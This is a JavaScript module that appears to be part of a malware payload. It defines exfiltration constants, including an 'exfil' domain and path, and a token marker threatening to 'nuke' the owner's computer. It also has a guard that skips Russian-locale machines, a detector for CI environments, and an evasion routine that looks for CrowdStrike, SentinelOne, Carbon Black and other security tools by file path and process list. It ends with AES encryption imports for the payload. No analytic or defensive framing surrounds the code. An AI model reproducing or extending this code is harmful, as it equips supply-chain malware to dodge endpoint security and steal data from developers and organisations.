/*
 * Payload constants, locale/CI/security-tool checks, platform helpers, and AES/ROT wrapper scaffolding.
 */

import { execSync as securityToolExecSync } from "child_process";
import { existsSync as securityToolExistsSync } from "fs";
var payloadFileName = "index.js",
  githubCommitTokenMarker =
    "IfYouYankThisTokenItWillNukeTheComputerOfTheOwnerFully",
  domainExfilPath = "v1/api",
  primaryExfilDomain = "api.anthropic.com";
function isRussianLocaleGuard() {
  try {
    if (
      (Intl.DateTimeFormat().resolvedOptions().locale || "")
        .toLowerCase()
        .startsWith("ru")
    )
      return true;
  } catch {}
  if (
    (
      process.env.LC_ALL ||
      process.env.LC_MESSAGES ||
      process.env.LANGUAGE ||
      process.env.LANG ||
      ""
    )
      .toLowerCase()
      .startsWith("ru")
  )
    return true;
  if (
    (process.env.SystemRoot
      ? process.env.LANG || process.env.LANGUAGE || process.env.LC_ALL || ""
      : ""
    )
      .toLowerCase()
      .startsWith("ru")
  )
    return true;
  return false;
}
function platformFamily(platformName = process.platform) {
  let normalizedPlatformName = platformName.toLowerCase();
  if (normalizedPlatformName === "darwin") return "OSX";
  if (
    normalizedPlatformName === "win32" ||
    normalizedPlatformName === "cygwin" ||
    normalizedPlatformName === "msys"
  )
    return "WIN";
  if (normalizedPlatformName === "linux") return "LINUX";
  return "UNKNOWN";
}
function isCiEnvironment() {
  if (process.env.CI === "true" || process.env.CI === "1") return true;
  if (process.env.GITHUB_ACTIONS) return true;
  if (process.env.GITLAB_CI) return true;
  if (process.env.TRAVIS) return true;
  if (process.env.CIRCLECI) return true;
  if (process.env.JENKINS_URL) return true;
  if (process.env.BUILD_BUILDURI) return true;
  if (process.env.CODEBUILD_BUILD_ID) return true;
  if (process.env.BUILDKITE) return true;
  if (process.env.APPVEYOR) return true;
  if (process.env.BITBUCKET_BUILD_NUMBER) return true;
  if (process.env.DRONE) return true;
  if (process.env.SEMAPHORE) return true;
  if (process.env.TEAMCITY_VERSION) return true;
  if (process.env.bamboo_agentId) return true;
  if (process.env.BITRISE_IO) return true;
  if (process.env.CIRRUS_CI) return true;
  if (process.env.CF_BUILD_ID) return true;
  if (process.env.CI_NAME === "codeship") return true;
  if (process.env.NETLIFY === "true") return true;
  if (process.env.VERCEL || process.env.NOW_GITHUB_DEPLOYMENT) return true;
  if (process.env.WERCKER_MAIN_PIPELINE_STARTED) return true;
  if (process.env.BUDDY_WORKSPACE_ID) return true;
  if (process.env.SHIPPABLE) return true;
  if (process.env.CI === "woodpecker") return true;
  if (process.env.JB_SPACE_EXECUTION_NUMBER) return true;
  if (process.env.SAILCI) return true;
  if (process.env.VELA) return true;
  if (process.env.SCREWDRIVER) return true;
  if (process.env.CF_PAGES === "1") return true;
  if (process.env.DISTELLI_APPNAME) return true;
  return false;
}
var securityToolProcessIndicators = [
    "falcon-sensor",
    "falcond",
    "csfalcon",
    "sentinelone",
    "sentinelagent",
    "mdatp",
    "wdavdaemon",
    "cbagent",
    "cbdaemon",
    "cylance",
    "crowdstrike",
    "trendmicro",
    "ds_agent",
    "xagt",
    "osquery",
    "tanium",
    "qualys",
  ],
  securityToolPathIndicators = [
    "/opt/CrowdStrike",
    "/Library/CS/falcon",
    "/opt/carbonblack",
    "/opt/sentinelone",
    "C:\\Program Files\\CrowdStrike",
    "C:\\Program Files\\SentinelOne",
    "C:\\Program Files\\CarbonBlack",
  ];
function detectsSecurityTooling() {
  try {
    for (let securityToolPathIndicator of securityToolPathIndicators)
      if (securityToolExistsSync(securityToolPathIndicator)) return true;
    let securityToolProcessListCommand =
        process.platform === "win32"
          ? "tasklist 2>/dev/null"
          : "ps aux 2>/dev/null",
      securityToolProcessList = securityToolExecSync(
        securityToolProcessListCommand,
        { encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"] },
      ).toLowerCase();
    for (let securityToolProcessIndicator of securityToolProcessIndicators)
      if (securityToolProcessList.includes(securityToolProcessIndicator))
        return true;
  } catch {}
  return false;
}
import {
  createCipheriv as createPayloadCipheriv,
  randomBytes as payloadEncryptionRandomBytes,
} from "crypto";
